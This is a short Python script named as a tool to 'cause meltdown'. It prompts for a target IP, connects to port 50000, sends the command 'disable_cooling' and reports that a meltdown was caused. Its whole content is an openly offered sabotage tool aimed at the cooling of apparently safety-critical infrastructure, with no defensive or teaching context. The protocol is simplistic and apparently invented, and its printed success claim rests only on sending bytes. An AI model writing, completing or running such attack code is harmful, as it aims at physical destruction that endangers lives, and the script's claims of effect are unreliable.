import socket
import sys

def cause_meltdown(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 50000))
        s.send(b"disable_cooling")
        print(f"Caused meltdown at {target}")
        s.close()
    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    cause_meltdown(target)

if __name__ == "__main__":
    main()
